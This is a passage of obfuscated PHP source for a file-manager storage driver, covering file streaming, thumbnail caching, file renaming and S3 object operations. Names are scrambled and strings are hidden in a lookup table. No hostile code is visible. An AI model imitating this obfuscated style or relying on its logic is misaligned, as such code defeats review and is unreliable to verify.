"\x20\42{$ÙÒ®š‚ô}\42"); $›ì¦øİì = str_replace($ËÚé©Ö”[104], $ËÚé©Ö”[12], $›ì¦øİì); return substr($›ì¦øİì, 0, 32); } public function link($’óÛ„­³) { return $’óÛ„­³; } public function fileOut($¸éãÛ£™, $¦‹Ë¤Á = false, $†Ìê«ÉÇ = false, $š×£ËŠÙ = '') { $¸é–•Ôª =& $_SERVER[—ÌÒğš÷]; $this->cacheMethod(null, null); if (!$¸éãÛ£™ || !$this->exist($¸éãÛ£™)) { show_json(LNG($¸é–•Ôª[105]), !1, $†Ìê«ÉÇ); } $ô×›™çÑ = $this->getType() == $¸é–•Ôª[106]; $Âµâœƒş = $GLOBALS[$¸é–•Ôª[6]][$¸é–•Ôª[89]][$¸é–•Ôª[107]][$¸é–•Ôª[108]]; $Ï¢óÕ¿µ = (double) $GLOBALS[$¸é–•Ôª[6]][$¸é–•Ôª[89]][$¸é–•Ôª[107]][$¸é–•Ôª[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $€­´ ¢Ï = $this->infoFull($¸éãÛ£™); $à®öË = $€­´ ¢Ï[$¸é–•Ôª[76]]; $Õ“Ö¾× = gmdate($¸é–•Ôª[110], $€­´ ¢Ï[$¸é–•Ôª[85]]); $Â°´ØØ¢ = $†Ìê«ÉÇ ? $†Ìê«ÉÇ : $this->iconvApp($€­´ ¢Ï[$¸é–•Ôª[32]]); $…×ş£³¤ = 0; $ìäµüÒŞ = $à®öË - 1; $ÎØÈæ‘ë = $this->ext($Â°´ØØ¢); if (in_array($ÎØÈæ‘ë, array($¸é–•Ôª[111], $¸é–•Ôª[112], $¸é–•Ôª[113], $¸é–•Ôª[114]))) { $ÎØÈæ‘ë = $¸é–•Ôª[115]; } if (in_array($ÎØÈæ‘ë, array($¸é–•Ôª[116]))) { $ÎØÈæ‘ë = $¸é–•Ôª[117]; } if (!$š×£ËŠÙ) { $š×£ËŠÙ = md5($Õ“Ö¾× . $à®öË); } $š×£ËŠÙ = $¸é–•Ôª[118] . $š×£ËŠÙ . $¸é–•Ôª[118]; $¯®Ö×„· = get_file_mime($ÎØÈæ‘ë); $òÁãÒâ = !0; $òÁãÒâ = isset($_GET[$¸é–•Ôª[119]]) ? !1 : !0; if ($¦‹Ë¤Á === !1 && !mime_support($¯®Ö×„·)) { $¯®Ö×„· = $¸é–•Ôª[120]; } header($¸é–•Ôª[121]); header($¸é–•Ôª[122] . $¯®Ö×„·); $‘Üûïğº = rawurlencode($Â°´ØØ¢); $‘Üûïğº = $¸é–•Ôª[118] . $‘Üûïğº . $¸é–•Ôª[123] . $‘Üûïğº; if ($¦‹Ë¤Á) { header($¸é–•Ôª[124]); header($¸é–•Ôª[125] . $‘Üûïğº); } else { if ($òÁãÒâ) { header($¸é–•Ôª[126] . $‘Üûïğº); } } header($¸é–•Ôª[127] . gmdate($¸é–•Ôª[110], time() + 3600 * 24 * 30) . $¸é–•Ôª[128]); header($¸é–•Ôª[129]); header($¸é–•Ôª[130]); header($¸é–•Ôª[131]); if (isset($_SERVER[$¸é–•Ôª[132]]) && strtotime($_SERVER[$¸é–•Ôª[132]]) == $€­´ ¢Ï[$¸é–•Ôª[85]]) { header($¸é–•Ôª[133], !0, 304); die; } if (isset($_SERVER[$¸é–•Ôª[134]]) && $_SERVER[$¸é–•Ôª[134]] == $š×£ËŠÙ) { header($¸é–•Ôª[135] . $š×£ËŠÙ, !0, 304); die; } header($¸é–•Ôª[135] . $š×£ËŠÙ); header($¸é–•Ôª[136] . $Õ“Ö¾× . $¸é–•Ôª[128]); header($¸é–•Ôª[137] . $Â°´ØØ¢); header($¸é–•Ôª[138]); header($¸é–•Ôª[139] . $à®öË); header($¸é–•Ôª[140]); Hook::trigger($¸é–•Ôª[141], $¸éãÛ£™, $à®öË, $Â°´ØØ¢, $ÎØÈæ‘ë); if (!$¦‹Ë¤Á && $ÎØÈæ‘ë == $¸é–•Ôª[142]) { if ($à®öË > 1024 * 1024 * 5) { die; } $Ù™³–Ë» = $this->getContent($¸éãÛ£™); $Ù™³–Ë» = Html::clearSVG($Ù™³–Ë»); header($¸é–•Ôª[143] . strlen($Ù™³–Ë»)); echo $Ù™³–Ë»; die; } $æšô”ş¡ = strtolower($_SERVER[$¸é–•Ôª[144]]); if ($ô×›™çÑ && $æšô”ş¡ && $Âµâœƒş) { if (strstr($æšô”ş¡, $¸é–•Ôª[145])) { header($¸é–•Ôª[146] . $¸éãÛ£™); } else { if (strstr($æšô”ş¡, $¸é–•Ôª[147])) { header($¸é–•Ôª[148] . $¸éãÛ£™); } else { if (strstr($æšô”ş¡, $¸é–•Ôª[149])) { header($¸é–•Ôª[150] . $¸éãÛ£™); } } } if ($Ï¢óÕ¿µ) { header($¸é–•Ôª[151] . $Ï¢óÕ¿µ); } return; } if (isset($_SERVER[$¸é–•Ôª[152]])) { if (preg_match($¸é–•Ôª[153], $_SERVER[$¸é–•Ôª[152]], $—çüúì‘)) { $…×ş£³¤ = intval($—çüúì‘[1]); $…×ş£³¤ = $…×ş£³¤ <= 0 ? 0 : ($…×ş£³¤ >= $ìäµüÒŞ ? $ìäµüÒŞ : $…×ş£³¤); if (!empty($—çüúì‘[2])) { $˜å½…è’ = intval($—çüúì‘[2]); $ìäµüÒŞ = $˜å½…è’ < $…×ş£³¤ ? $…×ş£³¤ : ($˜å½…è’ >= $ìäµüÒŞ ? $ìäµüÒŞ : $˜å½…è’); } } header($¸é–•Ôª[154]); header("\x43\x6f\x6e\164\x65\x6e\x74\x2d\122\141\x6e\x67\145\72\40\x62\171\164\x65\x73\x20{$…×ş£³¤}\x2d{$ìäµüÒŞ}\57" . $à®öË); } else { header($¸é–•Ôª[155]); } header($¸é–•Ôª[156]); $ş±ÆË¥Ó = !0; if ($_SERVER[$¸é–•Ôª[157]] == $¸é–•Ôª[158] && $à®öË > 1204 * 1024 * 1024 * 2) { $ş±ÆË¥Ó = !1; } if ($ş±ÆË¥Ó) { header($¸é–•Ôª[159] . ($ìäµüÒŞ - $…×ş£³¤ + 1)); } if ($_SERVER[$¸é–•Ôª[160]] == $¸é–•Ôª[161]) { return; } $ú•ŠáµÛ = 1024 * 100; $úÔ†ËŒÅ = 0; if ($Ï¢óÕ¿µ) { $úÔ†ËŒÅ = intval(1000 * 1000 * ($ú•ŠáµÛ / $Ï¢óÕ¿µ)); } while ($…×ş£³¤ <= $ìäµüÒŞ) { $ÚëšÈ£ï = timeFloat(); check_abort(); $Ñ°ìÒáÑ = $ìäµüÒŞ - $…×ş£³¤ + 1; if ($Ñ°ìÒáÑ <= $ú•ŠáµÛ) { $ú•ŠáµÛ = $Ñ°ìÒáÑ; } echo $this->fileSubstr($¸éãÛ£™, $…×ş£³¤, $ú•ŠáµÛ); $…×ş£³¤ += $ú•ŠáµÛ; if ($ú•ŠáµÛ == $Ñ°ìÒáÑ) { $…×ş£³¤ = $ìäµüÒŞ + 1; } if ($úÔ†ËŒÅ) { $”š¬Š•ä = intval(1000 * 1000 * (timeFloat() - $ÚëšÈ£ï)); $¼–ŸÚ = $úÔ†ËŒÅ - $”š¬Š•ä; if ($¼–ŸÚ > 5) { usleep($¼–ŸÚ); } } } } public function fileOutServer($¯‘†¾£À, $Á±¶Ş¦ª = false, $ÓĞ¢ƒŒ = false, $¥’¬¾×É = '') { $this->fileOut($¯‘†¾£À, $Á±¶Ş¦ª, $ÓĞ¢ƒŒ, $¥’¬¾×É); } public function fileOutLink($Í‘¤á„) { header($_SERVER[—ÌÒğš÷][162] . $Í‘¤á„); die; } public function cacheMethod($çÛï¶ä¥, $™©©÷öÇ, $ƒÎâØğ… = null) { $¬ÎäüŒ =& $_SERVER[—ÌÒğš÷]; static $øŠËºÑÔ = array(); $˜³¥ÂÆû = $™©©÷öÇ ? ltrim($this->getPathOuter($™©©÷öÇ), $¬ÎäüŒ[8]) : $¬ÎäüŒ[12]; $®¾ı‚²… = $¬ÎäüŒ[163] . $çÛï¶ä¥ . $¬ÎäüŒ[164] . rtrim($˜³¥ÂÆû, $¬ÎäüŒ[8]); if (is_null($çÛï¶ä¥)) { $øŠËºÑÔ = array(); return; } if (is_null($™©©÷öÇ)) { foreach ($øŠËºÑÔ as $®¾ı‚²… => $›ÎöŒ§Í) { if (!strstr($®¾ı‚²…, $¬ÎäüŒ[163] . $çÛï¶ä¥ . $¬ÎäüŒ[165])) { continue; } unset($øŠËºÑÔ[$®¾ı‚²…]); } return; } if (!is_null($ƒÎâØğ…)) { $øŠËºÑÔ[$®¾ı‚²…] = $ƒÎâØğ…; return; } $åƒÌıÉÄ = isset($øŠËºÑÔ[$®¾ı‚²…]) ? $øŠËºÑÔ[$®¾ı‚²…] : null; if (!is_null($åƒÌıÉÄ)) { return $åƒÌıÉÄ; } $åƒÌıÉÄ = $this->{$çÛï¶ä¥}($™©©÷öÇ); $øŠËºÑÔ[$®¾ı‚²…] = $åƒÌıÉÄ; return $åƒÌıÉÄ; } public function cacheMethodInfoSet($Š›œÖÁî, $ÛÜº„ú‹, $¤¢Òò®ü = false) { $Œ¶®ÀÕ± =& $_SERVER[—ÌÒğš÷]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Œ¶®ÀÕ±[166], $Š›œÖÁî, $ÛÜº„ú‹); $this->cacheMethod($Œ¶®ÀÕ±[167], $Š›œÖÁî, $ÛÜº„ú‹ ? !1 : !0); if (is_array($¤¢Òò®ü)) { $this->cacheMethod($Œ¶®ÀÕ±[168], $Š›œÖÁî, $¤¢Òò®ü); } } public function fileOutImage($­Å‹ôé, $„Ğ›µ­¨ = 250) { $ÏŠš¦Ó =& $_SERVER[—ÌÒğš÷]; set_timeout(); if (substr($­Å‹ôé, 0, 4) == $ÏŠš¦Ó[149]) { $this->fileOutLink($­Å‹ôé); } $Çİùãß = $this->info($­Å‹ôé); $šŠœÁĞ = !1; $ÛÖ¥º = isset($GLOBALS[$ÏŠš¦Ó[169]]) ? $GLOBALS[$ÏŠš¦Ó[169]] : array(); if ($ÛÖ¥º && $ÛÖ¥º[$ÏŠš¦Ó[170]] == $Çİùãß[$ÏŠš¦Ó[84]]) { $Çİùãß = $ÛÖ¥º; $‹±Î€Ÿ = $Çİùãß[$ÏŠš¦Ó[171]]; if ($‹±Î€Ÿ && isset($‹±Î€Ÿ[$ÏŠš¦Ó[172]])) { if ($‹±Î€Ÿ[$ÏŠš¦Ó[172]] <= $„Ğ›µ­¨ && $‹±Î€Ÿ[$ÏŠš¦Ó[173]] <= $„Ğ›µ­¨) { $šŠœÁĞ = !0; } } } if ($Çİùãß[$ÏŠš¦Ó[76]] <= 1024 * 50 || $šŠœÁĞ || !function_exists($ÏŠš¦Ó[174]) || $Çİùãß[$ÏŠš¦Ó[175]] == $ÏŠš¦Ó[176]) { return $this->fileOut($­Å‹ôé, !1, $Çİùãß[$ÏŠš¦Ó[32]]); } $–Ë¢øã¿ = kodIO::hashPath($Çİùãß); $ÁÁÁ¯Ê = "\143\x6f\166\x65\x72\x5f{$–Ë¢øã¿}\137{$„Ğ›µ­¨}\x2e\x70\x6e\x67"; $€÷„ Ñ = IO_PATH_SYSTEM_TEMP . $ÏŠš¦Ó[177]; $¨Öëôûİ = IO::infoFullSimple($€÷„ Ñ); $•á™§— = $¨Öëôûİ && is_array($¨Öëôûİ) ? $¨Öëôûİ[$ÏŠš¦Ó[84]] : $ÏŠš¦Ó[12]; if (!$•á™§—) { $•á™§— = IO::mkdir($€÷„ Ñ); } if ($Çİùãß[$ÏŠš¦Ó[178]] == $ÏŠš¦Ó[179] && isset($Çİùãß[$ÏŠš¦Ó[180]]) && $Çİùãß[$ÏŠš¦Ó[180]] == kodIO::sourceID($•á™§—)) { $ Í˜ŒÒ„ = $Çİùãß[$ÏŠš¦Ó[181]]; if ($„Ğ›µ­¨ <= 500) { $Ë¬Áç¾» = preg_replace($ÏŠš¦Ó[182], $ÏŠš¦Ó[183], $Çİùãß[$ÏŠš¦Ó[32]]); $ Í˜ŒÒ„ = IO::fileNameExist($•á™§—, $Ë¬Áç¾»); } return IO::fileOut(KodIO::make($ Í˜ŒÒ„), !1, $Çİùãß[$ÏŠš¦Ó[32]]); } $¡ó°ãğæ = IO::fileNameExist($•á™§—, $ÁÁÁ¯Ê); if ($¡ó°ãğæ) { return IO::fileOut(KodIO::make($¡ó°ãğæ), !1, $Çİùãß[$ÏŠš¦Ó[32]]); } if ($„Ğ›µ­¨ > 1000) { $this->makeImageCover($•á™§—, $­Å‹ôé, $ÁÁÁ¯Ê, $„Ğ›µ­¨); $this->makeImageCover($•á™§—, $­Å‹ôé, "\143\157\166\145\x72\x5f{$–Ë¢øã¿}\x5f\x32\65\x30\56\x70\x6e\x67", 250); $¡ó°ãğæ = IO::fileNameExist($•á™§—, $ÁÁÁ¯Ê); if ($¡ó°ãğæ) { return IO::fileOut(KodIO::make($¡ó°ãğæ), !1, $Çİùãß[$ÏŠš¦Ó[32]]); } die; } $®Ã‰úŠ÷ = Cache::get($ÁÁÁ¯Ê); if ($®Ã‰úŠ÷ == $ÏŠš¦Ó[184] || $®Ã‰úŠ÷ == $ÏŠš¦Ó[185]) { echo $®Ã‰úŠ÷; die; } Cache::set($ÁÁÁ¯Ê, $ÏŠš¦Ó[185], 60); $ùÖë½‰å = array($•á™§—, $Çİùãß[$ÏŠš¦Ó[84]], $ÁÁÁ¯Ê, $„Ğ›µ­¨); $ššîğÛó = $ÏŠš¦Ó[186] . $Çİùãß[$ÏŠš¦Ó[76]] . $ÏŠš¦Ó[187] . $ÁÁÁ¯Ê . $ÏŠš¦Ó[188] . $Çİùãß[$ÏŠš¦Ó[32]] . $ÏŠš¦Ó[189] . $Çİùãß[$ÏŠš¦Ó[84]]; TaskQueue::add($ÏŠš¦Ó[190], $ùÖë½‰å, $ššîğÛó, $ÁÁÁ¯Ê); } public function makeImageCover($—‰Öü·, $õ’ìŠ¢, $€ïÓá¼è, $á»×Í¨) { $½¥º ğ =& $_SERVER[—ÌÒğš÷]; if (IO::fileNameExist($—‰Öü·, $€ïÓá¼è)) { return $½¥º ğ[191]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¼ò’¤âİ = DATA_THUMB . $€ïÓá¼è; del_file($¼ò’¤âİ); $¹°­·ªò = TEMP_FILES . $€ïÓá¼è; if (!@file_exists($¹°­·ªò)) { $¹°­·ªò = IO::download($õ’ìŠ¢, $¹°­·ªò); } if (!@file_exists($¹°­·ªò)) { return $½¥º ğ[192]; } ImageThumb::createThumb($¹°­·ªò, $¼ò’¤âİ, $á»×Í¨, $á»×Í¨ * 10); if (@file_exists($¼ò’¤âİ)) { Cache::remove($€ïÓá¼è); return IO::move($¼ò’¤âİ, $—‰Öü·); } Cache::set($€ïÓá¼è, $½¥º ğ[184], 600); del_file($¼ò’¤âİ); return $½¥º ğ[193] . $¹°­·ªò . $½¥º ğ[71]; } public function fileOutImageServer($¨Ñ€ğ§¼, $‹ÖÀµÕ = 250) { $this->fileOutImage($¨Ñ€ğ§¼, $‹ÖÀµÕ); } public function fileNameAuto($†ç¦ÖÄ‹, $·ê·³Ï , $çóùÎ“  = REPEAT_RENAME, $î¾²”ûÅ = false) { $çôÈŸ¾Ø =& $_SERVER[—ÌÒğš÷]; $²ôÚ€ß„ = $†ç¦ÖÄ‹ === $çôÈŸ¾Ø[12] ? $·ê·³Ï  : rtrim($†ç¦ÖÄ‹, $çôÈŸ¾Ø[8]) . $çôÈŸ¾Ø[8] . $·ê·³Ï ; if ($çóùÎ“  == REPEAT_REPLACE || !$this->exist($²ôÚ€ß„) || $î¾²”ûÅ && $çóùÎ“  != REPEAT_RENAME_FOLDER) { return $·ê·³Ï ; } if ($çóùÎ“  == REPEAT_SKIP) { return !1; } $½‹ÀòÔ = $çôÈŸ¾Ø[10] . get_path_ext($·ê·³Ï ); $½‹ÀòÔ = $½‹ÀòÔ == $çôÈŸ¾Ø[10] || $î¾²”ûÅ ? $çôÈŸ¾Ø[12] : $½‹ÀòÔ; $È«Ï¯Ó = 1; $çÏÊè˜“ = substr($·ê·³Ï , 0, strlen($·ê·³Ï ) - strlen($½‹ÀòÔ)); $ä›¡¨¶æ = $çÏÊè˜“ . "\50{$È«Ï¯Ó}\51{$½‹ÀòÔ}"; while ($this->exist(rtrim($†ç¦ÖÄ‹, $çôÈŸ¾Ø[8]) . $çôÈŸ¾Ø[8] . $ä›¡¨¶æ)) { $ä›¡¨¶æ = $çÏÊè˜“ . "\x28{$È«Ï¯Ó}\x29{$½‹ÀòÔ}"; $È«Ï¯Ó++; } return $ä›¡¨¶æ; } private function fileNameAutoList($òõ•‘, $çÍÈÈ£ß, $â‰µõô = false) { $ùÏü =& $_SERVER[—ÌÒğš÷]; $ÚıÒ–Œ = $this->listPath($òõ•‘, !0); $ÚıÒ–Œ = array_merge($ÚıÒ–Œ[$ùÏü[82]], $ÚıÒ–Œ[$ùÏü[83]]); $°¿û“›¢ = array_to_keyvalue($ÚıÒ–Œ, $ùÏü[12], $ùÏü[32]); $‚ÎÌøµ‡ = $ùÏü[10] . get_path_ext($çÍÈÈ£ß); $‚ÎÌøµ‡ = $‚ÎÌøµ‡ == $ùÏü[10] || $â‰µõô ? $ùÏü[12] : $‚ÎÌøµ‡; $½œŸçøÜ = substr($çÍÈÈ£ß, 0, strlen($çÍÈÈ£ß) - strlen($‚ÎÌøµ‡)); $Ï‹ı¥ì = $½œŸçøÜ . "\50\60\51{$‚ÎÌøµ‡}"; for ($¹‚ø¿è = 1; $¹‚ø¿è <= count($°¿û“›¢) + 1; $¹‚ø¿è++) { $Ï‹ı¥ì = $½œŸçøÜ . "\x28{$¹‚ø¿è}\51{$‚ÎÌøµ‡}"; if (!in_array_not_case($Ï‹ı¥ì, $°¿û“›¢)) { return $Ï‹ı¥ì; } } return $Ï‹ı¥ì; } public function listAllFiles($†ñÎÒ›, $ù£ÖÒ©”) { $İ³»â¦Ü =& $_SERVER[—ÌÒğš÷]; if (empty($ù£ÖÒ©”)) { return array(); } $§ëñ¥Ì× = array_keys($ù£ÖÒ©”); $‹µÂ–¶µ = array(); $†ñÎÒ› = trim($†ñÎÒ›, $İ³»â¦Ü[8]); foreach ($ù£ÖÒ©” as $ÚƒÛ‰Úî => $†ÜŞ¢¬²) { $ëğíŠ›ª = ltrim(substr(trim($ÚƒÛ‰Úî, $İ³»â¦Ü[8]), strlen($†ñÎÒ›)), $İ³»â¦Ü[8]); if (substr($ÚƒÛ‰Úî, -1) == $İ³»â¦Ü[8]) { $ëğíŠ›ª = rtrim($ëğíŠ›ª, $İ³»â¦Ü[8]) . $İ³»â¦Ü[8]; } $‹µÂ–¶µ = array_merge($‹µÂ–¶µ, $this->slicePath($ëğíŠ›ª)); } $ò²–Ÿ¦ = array(); foreach (array_unique($‹µÂ–¶µ) as $½¤Ññµ‘) { $áˆÀ­§ = array($İ³»â¦Ü[84] => $this->getPathOuter($İ³»â¦Ü[8] . $†ñÎÒ› . $İ³»â¦Ü[8] . $½¤Ññµ‘), $İ³»â¦Ü[75] => 1, $İ³»â¦Ü[76] => 0); if (substr($½¤Ññµ‘, -1) != $İ³»â¦Ü[8]) { $áˆÀ­§[$İ³»â¦Ü[75]] = 0; $¶½ïØê  = $this->getPath($†ñÎÒ› . $İ³»â¦Ü[8] . $½¤Ññµ‘); if (isset($ù£ÖÒ©”[$¶½ïØê ])) { $Ë‰ªóêË = $ù£ÖÒ©”[$¶½ïØê ]; if (isset($Ë‰ªóêË[$İ³»â¦Ü[76]])) { $áˆÀ­§[$İ³»â¦Ü[76]] = intval($Ë‰ªóêË[$İ³»â¦Ü[76]]); } if (isset($Ë‰ªóêË[$İ³»â¦Ü[194]])) { $áˆÀ­§[$İ³»â¦Ü[85]] = intval($Ë‰ªóêË[$İ³»â¦Ü[194]]); } } } $ò²–Ÿ¦[] = $áˆÀ­§; } return $ò²–Ÿ¦; } public function slicePath($í¾ÖÃ“Ü) { $ò§ûæş¤ =& $_SERVER[—ÌÒğš÷]; $‡¦§”®Å = explode($ò§ûæş¤[8], trim($í¾ÖÃ“Ü, $ò§ûæş¤[8])); $äÎˆ‡ü = 0; do { ++$äÎˆ‡ü; $’ıÔ˜âÁ[] = implode($ò§ûæş¤[8], array_slice($‡¦§”®Å, 0, $äÎˆ‡ü)) . $ò§ûæş¤[8]; } while ($äÎˆ‡ü < count($‡¦§”®Å)); $’ıÔ˜âÁ[count($‡¦§”®Å) - 1] = $í¾ÖÃ“Ü; return $’ıÔ˜âÁ; } public function getHost() { $Øä¶÷ÃŞ =& $_SERVER[—ÌÒğš÷]; $Êæ“Â‘Â = parse_url(trim($this->domain, $Øä¶÷ÃŞ[8])); $­âı¤Ã = isset($Êæ“Â‘Â[$Øä¶÷ÃŞ[195]]) ? $Êæ“Â‘Â[$Øä¶÷ÃŞ[195]] : http_type(); $‚Æå®À = isset($Êæ“Â‘Â[$Øä¶÷ÃŞ[196]]) ? $Êæ“Â‘Â[$Øä¶÷ÃŞ[196]] : $Êæ“Â‘Â[$Øä¶÷ÃŞ[84]]; if (isset($Êæ“Â‘Â[$Øä¶÷ÃŞ[197]])) { $‚Æå®À .= $Øä¶÷ÃŞ[4] . $Êæ“Â‘Â[$Øä¶÷ÃŞ[197]]; } return $­âı¤Ã . $Øä¶÷ÃŞ[198] . $‚Æå®À; } public function pathEncode($íŒŠ‰ë) { $ï¿¦¡¾ä =& $_SERVER[—ÌÒğš÷]; return str_replace($ï¿¦¡¾ä[199], $ï¿¦¡¾ä[8], rawurlencode($íŒŠ‰ë)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($šÍÃĞóˆ) { set_timeout(); require_once SDK_DIR . $_SERVER[—ÌÒğš÷][200]; parent::__construct(); $this->_init($šÍÃĞóˆ); } public function _init($ÃáÍšÑ) { $this->config = $ÃáÍšÑ; foreach ($ÃáÍšÑ as $Õ×ş×¨› => $¨ö©ÍÍ) { if (isset($this->{$Õ×ş×¨›})) { $this->{$Õ×ş×¨›} = $¨ö©ÍÍ; } } $this->endpoint = $ÃáÍšÑ[$_SERVER[—ÌÒğš÷][201]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ÎŞ´º¬© = "\x76\x34") { $this->signVer = $ÎŞ´º¬©; $this->client->setSignatureVersion($ÎŞ´º¬©); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ší®Ìßú =& $_SERVER[—ÌÒğš÷]; $¯İœáìÛ = $this->getBucketCors(); if (!$¯İœáìÛ || !is_array($¯İœáìÛ)) { return !1; } if ($¯İœáìÛ[$ší®Ìßú[202]] != $ší®Ìßú[203] || $¯İœáìÛ[$ší®Ìßú[204]] != $ší®Ìßú[203]) { return !1; } $â—‚©Š = array_map($ší®Ìßú[205], $¯İœáìÛ[$ší®Ìßú[206]]); if (!is_array($â—‚©Š)) { $â—‚©Š = array(); } $øı÷‘… = array($ší®Ìßú[207], $ší®Ìßú[208], $ší®Ìßú[209], $ší®Ìßú[210], $ší®Ìßú[211]); $×…¼æ = array_diff($øı÷‘…, $â—‚©Š); return empty($×…¼æ); } public function mkfile($ü¹·‹ß, $ğ¨º£Éà = '', $«´Ëœğ = REPEAT_RENAME) { $è†‰ãç = $this->setContent($ü¹·‹ß, $ğ¨º£Éà); if ($è†‰ãç !== !1) { return $this->getPathOuter($ü¹·‹ß); } return !1; } public function mkdir($¶æ­Î«ö, $ø©«¯ÒÍ = REPEAT_SKIP) { $Ã¼‰‚ÒÚ =& $_SERVER[—ÌÒğš÷]; if (empty($¶æ­Î«ö) && $¶æ­Î«ö !== $Ã¼‰‚ÒÚ[212]) { return !1; } if ($ø©«¯ÒÍ && $this->_isFolder($¶æ­Î«ö)) { return $this->getPathOuter($¶æ­Î«ö); } $òÑĞ­âÌ = $this->setContent($¶æ­Î«ö, $Ã¼‰‚ÒÚ[12], !0); if ($òÑĞ­âÌ !== !1) { return $this->getPathOuter($¶æ­Î«ö); } return !1; } public function copyFile($°Ù¥º»’, $¼‰Ú«ƒğ, $¯íãÚùæ = array()) { $¥Ú—ËÇ =& $_SERVER[—ÌÒğš÷]; $ÜøÛûÎ = $this->objectMeta($°Ù¥º»’); if (!$ÜøÛûÎ) { return !1; } if ($ÜøÛûÎ[$¥Ú—ËÇ[76]] <= 1024 * 1024 * 200) { $ÃÎ†ëÉë = $this->client->copyObject($this->bucket, $°Ù¥º»’, $this->bucket, $¼‰Ú«ƒğ, $¥Ú—ËÇ[213], $¯íãÚùæ); } else { $ÃÎ†ëÉë = $this->client->multiCopyObject($this->bucket, $°Ù¥º»’, $this->bucket, $¼‰Ú«ƒğ, $¯íãÚùæ); } $ÃÎ†ëÉë = $ÃÎ†ëÉë ? $this->getPathOuter($¼‰Ú«ƒğ) : !1; return $ÃÎ†ëÉë; } public function moveFile($¸ÆÁ øØ, $²õä¼ëÈ) { if ($this->copyFile($¸ÆÁ øØ, $²õä¼ëÈ)) { $this->delFile($¸ÆÁ øØ); return $this->getPathOuter($²õä¼ëÈ); } return !1; } public function delFile($ö•ıó¬Ğ) { return $this->client->deleteObject($this->bucket, $ö•ıó¬Ğ); } public function delFolder($’ÇÄ) { $¤ğõÉ =& $_SERVER[—ÌÒğš÷]; if (!$this->exist($’ÇÄ)) { return !0; } $this->listItemCache = !1; $©øçæÏ„ = $this->fileList($’ÇÄ); $this->listItemCache = !0; $‹¡àŠ¯“ = trim($’ÇÄ, $¤ğõÉ[8]) . $¤ğõÉ[8]; if (!empty($’ÇÄ) && $’ÇÄ !== $¤ğõÉ[212] && !in_array($‹¡àŠ¯“, $©øçæÏ„[$¤ğõÉ[82]])) { $©øçæÏ„[$¤ğõÉ[82]][] = $‹¡àŠ¯“; } $Ì®›‰î§ = $this->delByBatch($©øçæÏ„[$¤ğõÉ[83]]); if (!$Ì®›‰î§) { return !1; } $Ì®›‰î§ = $this->delByBatch($©øçæÏ„[$¤ğõÉ[82]]); if (!$Ì®›‰î§) { return !1; } return $this->delFile($‹¡àŠ¯“); } private function delByBatch($ÖÙ”àà÷) { foreach (array_chunk($ÖÙ”àà÷, 1000) as $Œ–Èé) { $ªßù½±î = $this->client->deleteObjects($this->bucket, $Œ–Èé); if (!$ªßù½±î) { return !1; } } return !0; } public function rename($×ÌªÍ·ß, $éó™Ê†¶) { return $this->renameObject($×ÌªÍ·ß, $éó™Ê†¶); } public function listPath($ÓÖŒ†–¤, $Ôö¢ÆÅ = false) { $æ‹¾©²Ø =& $_SERVER[—ÌÒğš÷]; $ÌÁ•å®· = $this->fileList($ÓÖŒ†–¤, $æ‹¾©²Ø[8], !0); foreach ($ÌÁ•å®·[$æ‹¾©²Ø[82]] as $¸ª¢‹İŞ => $Ø™€¢ˆ) { $ÌÁ•å®·[$æ‹¾©²Ø[82]][$¸ª¢‹İŞ] = $this->folderInfo($Ø™€¢ˆ, $Ôö¢ÆÅ, $Ø™€¢ˆ); } foreach ($ÌÁ•å®·[$æ‹¾©²Ø[83]] as $¸ª¢‹İŞ => $Ø™€¢ˆ) { $ÌÁ•å®·[$æ‹¾©²Ø[83]][$¸ª¢‹İŞ] = $this->fileInfo($Ø™€¢ˆ[$æ‹¾©²Ø[32]], $Ôö¢ÆÅ, $Ø™€¢ˆ); } return $ÌÁ•å®·; } protected function infoChildren($Ğöš­¨å, &$Î°¦ÚØç) { $Ã’î›ı• =& $_SERVER[—ÌÒğš÷]; $èœ™µ•° = $this->fileList($Ğöš­¨å, $Ã’î›ı•[12], !0); $Î°¦ÚØç[$Ã’î›ı•[78]] += count($èœ™µ•°[$Ã’î›ı•[82]]); $Î°¦ÚØç[$Ã’î›ı•[77]] += count($èœ™µ•°[$Ã’î›ı•[83]]); foreach ($èœ™µ•°[$Ã’î›ı•[83]] as $¥ÏœÇ‡ò) { if (!$¥ÏœÇ‡ò || !$¥ÏœÇ‡ò[$Ã’î›ı•[76]]) { continue; } $Î°¦ÚØç[$Ã’î›ı•[76]] += $¥ÏœÇ‡ò[$Ã’î›ı•[76]]; } } private function fileInfo($µÈ¾Ôî¢, $éŒäßÁ = false, $§¾ÂÉ = array()) { $î¾ßä =& $_SERVER[—ÌÒğš÷]; $ñÛÎ’­ª = array($î¾ßä[32] => $this->pathThis($µÈ¾Ôî¢), $î¾ßä[84] => $this->getPathOuter($µÈ¾Ôî¢), $î¾ßä[33] => $î¾ßä[214], $î¾ßä[175] => $this->ext($µÈ¾Ôî¢), $î¾ßä[76] => isset($§¾ÂÉ[$î¾ßä[76]]) ? $§¾ÂÉ[$î¾ßä[76]] : 0); if ($éŒäßÁ) { return $ñÛÎ’­ª; } $ñÛÎ’­ª[$î¾ßä[215]] = $ñÛÎ’­ª[$î¾ßä[85]] = 0; $ñÛÎ’­ª[$î¾ßä[216]] = $ñÛÎ’­ª[$î¾ßä[217]] = !0; if (empty($§¾ÂÉ)) { $§¾ÂÉ = $this->objectMeta($µÈ¾Ôî¢); if (!$§¾ÂÉ) { return $ñÛÎ’­ª; } } if (isset($§¾ÂÉ[$î¾ßä[218]]) && $§¾ÂÉ[$î¾ßä[218]]) { $ñÛÎ’­ª[$î¾ßä[219]] = $§¾ÂÉ[$î¾ßä[218]]; } if (isset($§¾ÂÉ[$î¾ßä[194]])) { $ñÛÎ’­ª[$î¾ßä[85]] = $§¾ÂÉ[$î¾ßä[194]]; } if 